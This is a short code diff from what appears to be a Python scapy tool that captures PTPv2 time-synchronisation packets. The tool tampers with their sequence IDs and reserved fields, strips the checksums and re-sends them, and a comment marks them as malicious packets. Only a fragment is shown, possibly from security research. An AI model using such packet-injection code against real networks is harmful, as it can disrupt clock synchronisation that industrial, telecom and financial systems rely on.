@@ -21,7 +21,7 @@ def packet_callback(packet):
             #print("original packet")
             print(packet.show())
             packet[PTPv2].reserved1 = 2
-            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 10
+            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
             original_ts = packet[PTPv2].preciseOriginTimestamp
 
             #packet[PTPv2].preciseOriginTimestamp = original_ts + count
@@ -33,7 +33,7 @@ def packet_callback(packet):
                 del(packet.getlayer(IP).chksum) 
                 del(packet.getlayer(UDP).chksum) 
                 sendp(packet)
-                packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 10
+                packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
             #print("send maliciouus packet")
             #print(packet[PTPv2].show())
             #exit()
